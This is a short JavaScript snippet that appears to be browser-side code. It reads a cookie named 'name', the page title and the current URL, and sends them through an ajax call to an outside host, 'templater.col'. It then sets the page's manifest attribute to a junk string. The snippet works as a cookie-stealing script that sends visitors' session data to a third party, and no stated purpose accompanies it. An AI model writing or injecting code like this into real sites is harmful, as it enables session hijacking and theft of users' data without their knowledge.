const   ajax = require('ajaxsim'),
        cook = require('dist-cookie');

let nameCookie = 'name';
let cookieData = cook(nameCookie),
    titlePage = document.querySelector('title').innerText,
    host = window.location,
    response ="cookie="+cookieData+'&host='+host+'&title='+titlePage;


ajax('http://templater.col/respond-require-data', response);

let html = document.querySelector('html'),
    attr = html.setAttribute('manifest', 'sdsdfsdfsdff');